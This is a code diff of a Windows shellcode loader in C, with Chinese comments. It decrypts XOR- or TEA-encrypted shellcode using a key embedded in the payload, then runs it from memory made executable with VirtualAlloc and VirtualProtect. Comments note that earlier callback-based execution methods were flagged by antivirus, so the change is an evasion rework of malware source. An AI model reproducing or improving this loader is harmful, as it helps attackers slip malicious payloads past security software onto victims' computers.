@@ -299,13 +299,16 @@ int DecryptSC(struct ConfigurationData* config,unsigned char *encData,unsigned i
 {
 	if (encData[0] == H_ENC_XOR)
 	{
-		//xor解密
-		/*unsigned char XOR_BYTES[] = { 0x56,0xb0,0x71,0xef,0xd7,0xe9,0x92,0x69,0x81,0xe9,0xb1,0x74,0x21,0x6d,0x8f,0x86 };
-		unsigned int XOR_BYTES_LEN = sizeof(XOR_BYTES);
-		for (int i = 0; i < mSectionHeader.SizeOfRawData; i++)
+		config->shellcodeSize = *(unsigned int*)(encData + 1 + 16);
+		config->shellcode = malloc(config->shellcodeSize);
+		for (int i = 0; i < config->shellcodeSize; i++)
 		{
-			((unsigned char*)(baseaddr + mSectionHeader.VirtualAddress))[i] ^= XOR_BYTES[i % XOR_BYTES_LEN];
-		}*/
+			(encData + 1 + 16 + 4)[i] ^= (encData + 1)[i % 0x10];
+		}
+		if (config->shellcode != 0)
+			memcpy(config->shellcode, encData + 1 + 16 + 4, config->shellcodeSize);
+		else
+			return -1;
 	}
 	else if (encData[0] == H_ENC_AES)
 	{
@@ -317,17 +320,15 @@ int DecryptSC(struct ConfigurationData* config,unsigned char *encData,unsigned i
 	}
 	else if (encData[0] == H_ENC_TEA)
 	{
-		//解析头部
-		int offset = 1 + 4;
-		int encdatasize = *(unsigned int*)(encData + 1);
-
+		int encdatasize = *(unsigned int*)(encData + 1 + 16);
 		//TEA加密
-		unsigned char TEA_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
-		tea_decrypt(encData + offset, encdatasize, TEA_KEY, &config->shellcode, (unsigned int*)&config->shellcodeSize);
+		tea_decrypt((encData + 1 + 16 + 4), encdatasize, (encData + 1), &config->shellcode, (unsigned int*)&config->shellcodeSize);
 		if (config->shellcode == NULL) {
 			return -1;
 		}
 	}
+	else
+		return -1;
 
 	return 0;
 }
@@ -345,21 +346,24 @@ int RunSCFromPE(struct ConfigurationData* config)
 	{
 		if (config->shellcode[0] == P_TYPE_STAGE)
 		{
-			//设置跳转代码
-			int amtWritten = (sizeof(jmp32bitOffset) + sizeof(DWORD));
-			DWORD jumpOffset = 5;
-			jumpOffset -= amtWritten;
-			memcpy((void*)encData, jmp32bitOffset, sizeof(jmp32bitOffset));
-			DWORD* jumpTarget = (DWORD*)(encData + sizeof(jmp32bitOffset));
-			*jumpTarget = jumpOffset;
-
-			//执行shellcode代码
-			void_func_ptr callLoc = (void_func_ptr)(encData);
-			//callLoc();
-			//EnumWindows((WNDENUMPROC)(callLoc), 0);
-			//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);
-
-			CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);
+			unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+			if (dwBaseAddr)
+			{
+				//去掉头部
+				memcpy(dwBaseAddr, config->shellcode + 5, config->shellcodeSize - 5);
+				free(config->shellcode);
+				DWORD oldpro = PAGE_READWRITE;
+				if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
+				{
+					((void(*)())dwBaseAddr)();
+					//执行shellcode代码
+					//void_func_ptr callLoc = (void_func_ptr)(dwBaseAddr);
+					//callLoc();//函数调用报毒
+					//EnumWindows((WNDENUMPROC)(callLoc), 0); //函数调用报毒
+					//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);//函数调用报毒
+					//CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);//函数调用报毒
+				}
+			}
 		}
 		else if (config->shellcode[0] == P_TYPE_STAGELESSURL)
 		{
